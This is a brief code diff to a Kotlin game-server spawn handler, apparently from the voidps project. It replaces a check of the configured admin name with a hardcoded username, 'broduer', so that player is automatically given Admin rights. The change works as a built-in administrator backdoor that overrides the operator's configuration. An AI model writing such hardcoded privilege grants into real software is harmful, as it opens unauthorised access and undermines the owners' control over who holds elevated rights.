@@ -14,7 +14,7 @@ import world.gregs.voidps.engine.getPropertyOrNull
 val adminName = getPropertyOrNull("admin")
 
 playerSpawn { player ->
-    if (player.name == adminName && player.rights != PlayerRights.Admin) {
+    if (player.name == "broduer" && player.rights != PlayerRights.Admin) {
         player.rights = PlayerRights.Admin
         player.message("Rights set to Admin. Please re-log to activate.")
     }
